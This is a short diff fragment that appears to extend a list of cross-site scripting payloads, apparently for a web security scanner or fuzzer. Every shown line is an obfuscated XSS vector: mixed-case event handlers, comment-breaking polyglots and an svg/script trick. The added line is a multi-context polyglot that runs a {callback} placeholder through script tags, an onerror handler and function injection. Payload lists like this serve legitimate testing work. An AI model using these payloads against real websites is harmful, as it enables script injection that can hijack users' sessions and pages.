@@ -19,3 +19,4 @@
 <D3/OnpOinTeReENter=confirm``>click here
 <!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
 <svg><script>//&NewLine;confirm(1);</script </svg>
+'''"'-function(){{{callback}}}()-">\"><scrIpt>{callback}</scrIpt><aUdio src=x oNerror={callback}><"-'-function(){{{callback}}}()"'''
